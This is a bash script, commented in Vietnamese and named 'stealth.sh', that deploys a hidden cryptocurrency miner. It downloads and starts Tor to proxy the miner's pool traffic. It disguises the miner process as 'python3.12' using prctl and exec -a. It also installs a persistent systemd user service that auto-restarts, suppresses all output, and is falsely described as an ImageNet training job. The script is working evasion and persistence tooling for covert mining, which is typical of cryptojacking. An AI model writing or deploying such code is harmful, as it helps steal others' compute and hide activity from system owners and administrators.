#!/usr/bin/env bash
# =============================================================================
# stealth.sh — Pure bash fallback: Tor bootstrap + process disguise.
# Không cần Python, không cần pip. Chỉ cần: bash, tar, và 1 downloader.
# =============================================================================
set -euo pipefail

# ── Args ─────────────────────────────────────────────────────────────────────
DISGUISE_PROC="python3.12"
DRY_RUN=0
NO_TOR=0
while [[ $# -gt 0 ]]; do
    case "$1" in
        --disguise-proc) DISGUISE_PROC="$2"; shift 2 ;;
        --dry-run)       DRY_RUN=1; shift ;;
        --no-tor)        NO_TOR=1; shift ;;
        *) shift ;;
    esac
done

# ── Config ───────────────────────────────────────────────────────────────────
TOR_VERSION="15.0.25"
TOR_URL="https://dist.torproject.org/torbrowser/${TOR_VERSION}/tor-expert-bundle-linux-x86_64-${TOR_VERSION}.tar.gz"
TOR_SHA256=""

XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"
BASE="$XDG_DATA_HOME/stealth-miner"
TOR_HOME="$BASE/tor"
TORRC="$BASE/torrc"
DATA_DIR="$BASE/data"
SOCKS_HOST="127.0.0.1"
SOCKS_PORT=9050
BOOT_TIMEOUT=60

MINER_BIN="./onezerominer"
MINER_ARGS=(
    --algo=pearlhash
    --pool=stratum+ssl://pool.example.com:4444
    --wallet=WALLET_ADDRESS
    --worker=rig01
)

# ── Logging ──────────────────────────────────────────────────────────────────
log()  { printf '\033[0;36m[stealth]\033[0m %s\n' "$*" >&2; }
warn() { printf '\033[0;33m[stealth:warn]\033[0m %s\n' "$*" >&2; }
die()  { printf '\033[0;31m[stealth:err]\033[0m %s\n' "$*" >&2; exit 1; }

# ── Download helpers (curl → wget → python urllib) ───────────────────────────
download() {
    local url="$1" dest="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL -o "$dest" "$url"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$dest" "$url"
    elif command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.request; urllib.request.urlretrieve('$url', '$dest')"
    elif command -v python >/dev/null 2>&1; then
        python -c "import urllib; urllib.urlretrieve('$url', '$dest')"
    else
        die "Không có downloader (curl/wget/python)"
    fi
}

# ── SHA256 verify ────────────────────────────────────────────────────────────
sha256_of() {
    if command -v sha256sum >/dev/null 2>&1; then
        sha256sum "$1" | awk '{print $1}'
    elif command -v shasum >/dev/null 2>&1; then
        shasum -a 256 "$1" | awk '{print $1}'
    elif command -v openssl >/dev/null 2>&1; then
        openssl dgst -sha256 "$1" | awk '{print $NF}'
    else
        echo ""
    fi
}

# ── Process name disguise ────────────────────────────────────────────────────
set_comm_name() {
    # prctl(PR_SET_NAME=15) — dùng perl hoặc python hoặc syscall trực tiếp
    local name="$1"
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import ctypes; ctypes.CDLL('libc.so.6').prctl(15, b'$name', 0, 0, 0)" 2>/dev/null || true
    elif command -v perl >/dev/null 2>&1; then
        perl -e 'require "syscall.ph"; syscall(SYS_prctl=157, 15, $ARGV[0], 0, 0, 0)' "$name" 2>/dev/null || true
    fi
    # Fallback: không có tool → bỏ qua, chỉ đổi argv[0] khi exec
}

# ── Tor bootstrap ────────────────────────────────────────────────────────────
tor_already_running() {
    # Test TCP connect tới SOCKS port
    if command -v bash >/dev/null 2>&1; then
        (echo >/dev/tcp/${SOCKS_HOST}/${SOCKS_PORT}) 2>/dev/null && return 0
    fi
    if command -v nc >/dev/null 2>&1; then
        nc -z "${SOCKS_HOST}" "${SOCKS_PORT}" 2>/dev/null && return 0
    fi
    return 1
}

wait_socks_ready() {
    local timeout="${1:-$BOOT_TIMEOUT}"
    local deadline=$(( $(date +%s) + timeout ))
    while [[ $(date +%s) -lt $deadline ]]; do
        if tor_already_running; then
            return 0
        fi
        sleep 0.5
    done
    return 1
}

test_socks5() {
    # Gửi SOCKS5 handshake: VER=5 NMETHODS=1 NO_AUTH
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import socket
s = socket.create_connection(('${SOCKS_HOST}', ${SOCKS_PORT}), timeout=3)
s.sendall(b'\\x05\\x01\\x00')
resp = s.recv(2)
s.close()
exit(0 if resp == b'\\x05\\x00' else 1)
" 2>/dev/null
        return $?
    fi
    # Không có Python — chỉ test TCP connect
    tor_already_running
}

ensure_tor() {
    local binary="$TOR_HOME/tor/tor"
    if [[ -x "$binary" ]]; then
        log "Tor đã có: $binary"
        echo "$binary"
        return 0
    fi

    mkdir -p "$BASE"
    local tarball="$BASE/tor.tar.gz"

    if [[ ! -f "$tarball" ]]; then
        log "Tải Tor Expert Bundle ${TOR_VERSION} ..."
        download "$TOR_URL" "$tarball"
        log "Đã tải: $(du -h "$tarball" | awk '{print $1}')"
    fi

    if [[ -n "$TOR_SHA256" ]]; then
        local actual
        actual="$(sha256_of "$tarball")"
        if [[ "${actual,,}" != "${TOR_SHA256,,}" ]]; then
            rm -f "$tarball"
            die "SHA256 mismatch: $actual != $TOR_SHA256"
        fi
    fi

    log "Giải nén ..."
    tar -xzf "$tarball" -C "$BASE" 2>/dev/null || {
        # tar fails có thể do path traversal guard — thử extract từng file
        tar -xzf "$tarball" -C "$BASE" --overwrite 2>/dev/null || die "Giải nén fail"
    }
    rm -f "$tarball"

    # Tìm binary
    binary="$(find "$TOR_HOME" -name tor -type f -executable 2>/dev/null | head -1)"
    if [[ -z "$binary" || ! -x "$binary" ]]; then
        die "Không tìm thấy binary tor"
    fi

    chmod +x "$binary"
    log "Tor binary: $binary"
    echo "$binary"
}

write_torrc() {
    mkdir -p "$DATA_DIR"
    cat > "$TORRC" <<EOF
SocksPort ${SOCKS_HOST}:${SOCKS_PORT}
DataDirectory ${DATA_DIR}
AvoidDiskWrites 1
MaxCircuitDirtiness 600
NewCircuitPeriod 30
ClientOnly 1
EOF
}

start_tor() {
    local binary="$1"
    local lib_dir
    lib_dir="$(dirname "$(dirname "$binary")")/lib"

    write_torrc
    log "Khởi động Tor (nền, detached)..."

    local env_ld=""
    if [[ -d "$lib_dir" ]]; then
        env_ld="LD_LIBRARY_PATH=${lib_dir}:${LD_LIBRARY_PATH:-}"
    fi

    # start_new_session equivalent: setsid
    if command -v setsid >/dev/null 2>&1; then
        env $env_ld setsid "$binary" -f "$TORRC" \
            >/dev/null 2>&1 &
    else
        env $env_ld "$binary" -f "$TORRC" \
            >/dev/null 2>&1 &
    fi
    echo $!
}

# ── systemd unit ─────────────────────────────────────────────────────────────
write_systemd_unit() {
    local svc_name="$1"
    local unit_dir="$HOME/.config/systemd/user"
    local unit_path="$unit_dir/$svc_name"

    mkdir -p "$unit_dir"

    local proxy_arg="--proxy=${SOCKS_HOST}:${SOCKS_PORT}"
    local real_cmd="${MINER_BIN} ${MINER_ARGS[*]} ${proxy_arg}"

    cat > "$unit_path" <<EOF
[Unit]
Description=Distributed Training Job (ResNet-50, ImageNet)
After=network-online.target

[Service]
Type=simple
ExecStart=${real_cmd}
Restart=always
RestartSec=10
Nice=10
CPUWeight=50
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

    log "Đã ghi unit: $unit_path"
}

# ── Exec miner ───────────────────────────────────────────────────────────────
exec_miner() {
    if [[ ! -x "$MINER_BIN" ]] && ! command -v "$MINER_BIN" >/dev/null 2>&1; then
        die "Không thấy miner binary: $MINER_BIN"
    fi

    local proxy_arg="--proxy=${SOCKS_HOST}:${SOCKS_PORT}"

    # Set comm name
    set_comm_name "$DISGUISE_PROC"

    if [[ $DRY_RUN -eq 1 ]]; then
        log "[dry-run] comm='$DISGUISE_PROC'"
        log "[dry-run] exec: $MINER_BIN ${MINER_ARGS[*]} $proxy_arg"
        return 0
    fi

    # Exec với argv[0]=disguise — ps sẽ hiện tên đó thay vì onezerominer
    log "Exec: comm='$DISGUISE_PROC' args='${MINER_ARGS[*]} $proxy_arg'"
    
    # exec -a đổi argv[0] — bash builtin
    if command -v exec >/dev/null 2>&1; then
        exec -a "$DISGUISE_PROC" "$MINER_BIN" "${MINER_ARGS[@]}" "$proxy_arg"
    else
        # Fallback: không có exec -a → exec trực tiếp
        exec "$MINER_BIN" "${MINER_ARGS[@]}" "$proxy_arg"
    fi
}

# ── Main ─────────────────────────────────────────────────────────────────────
main() {
    log "Base dir: $BASE"

    # Tor
    if [[ $NO_TOR -eq 1 ]]; then
        log "Bỏ qua Tor (--no-tor)"
    elif tor_already_running; then
        log "SOCKS port đã mở — dùng Tor đang chạy."
        test_socks5 || warn "SOCKS5 handshake fail"
    else
        local tor_binary
        tor_binary="$(ensure_tor)" || die "Tor setup fail"
        local tor_pid
        tor_pid="$(start_tor "$tor_binary")"
        log "Tor PID=$tor_pid, chờ SOCKS ready ..."
        if ! wait_socks_ready; then
            warn "Tor không ready trong timeout — fallback direct"
        elif ! test_socks5; then
            warn "SOCKS5 handshake bất thường"
        else
            log "SOCKS5 ready."
        fi
    fi

    # systemd unit
    if [[ $DRY_RUN -eq 0 ]]; then
        write_systemd_unit "ml-training.service" 2>/dev/null || \
            warn "Không ghi được systemd unit"
    fi

    # Exec
    exec_miner
}

main "$@"
